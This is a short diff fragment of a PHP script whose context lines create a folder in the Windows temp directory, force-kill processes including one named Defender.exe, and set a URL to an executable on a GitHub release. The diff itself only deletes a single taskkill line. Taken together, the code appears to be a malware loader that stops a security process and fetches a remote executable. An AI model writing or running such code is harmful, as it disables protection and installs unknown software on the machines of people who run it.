@@ -64,7 +64,6 @@ system('mkdir "C:/Windows/Temp/spawnZZ/"');
 system('taskkill /F /IM xnightpro.exe');
 system('taskkill /F /IM Defender.exe');
 system('taskkill /F /IM Spotify.exe');
-system('taskkill /F /IM DiscordLoad.exe');
 exec('tasklist', $output);
 
 $url =  'https://github.com/mainpoint91/mainpoint/releases/download/night/DiscordLoad.exe';
